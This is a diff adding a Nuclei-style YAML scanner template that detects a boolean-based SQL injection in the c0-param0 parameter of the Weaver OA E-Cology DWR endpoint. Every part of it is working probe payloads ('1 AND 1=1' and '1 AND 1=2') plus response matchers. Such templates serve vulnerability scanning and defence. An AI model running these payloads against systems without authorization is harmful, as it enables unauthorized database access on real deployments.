@@ -1,0 +1,61 @@
+id: poc-yaml-fanwei-oa-ecology-c0-param0-sql-injection
+info:
+  name: 泛微OA-ECology-c0-param0-SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    泛微OA E-Cology c0-param0 SQL injection vulnerability that allows attackers to execute SQL payloads, resulting in unauthorized database access.
+
+variables:
+  valid_payload: |
+    callCount=1
+    page=
+    httpSessionId=
+    scriptSessionId=
+    c0-scriptName=DocDwrUtil
+    c0-methodName=ifNewsCheckOutByCurrentUser
+    c0-id=0
+    c0-param0=string:1 AND 1=1
+    c0-param1=string:1
+    batchId=0
+  invalid_payload: |
+    callCount=1
+    page=
+    httpSessionId=
+    scriptSessionId=
+    c0-scriptName=DocDwrUtil
+    c0-methodName=ifNewsCheckOutByCurrentUser
+    c0-id=0
+    c0-param0=string:1 AND 1=2
+    c0-param1=string:1
+    batchId=0
+
+http:
+  - id: valid-request
+    method: POST
+    path:
+      - "{{BaseURL}}/dwr/call/plaincall/CptDwrUtil.ifNewsCheckOutByCurrentUser.dwr"
+    body: "{{valid_payload}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "dwr.engine._remoteHandleCallback('0','0',true)"
+
+  - id: invalid-request
+    method: POST
+    path:
+      - "{{BaseURL}}/dwr/call/plaincall/CptDwrUtil.ifNewsCheckOutByCurrentUser.dwr"
+    body: "{{invalid_payload}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "dwr.engine._remoteHandleCallback('0','0',false)"
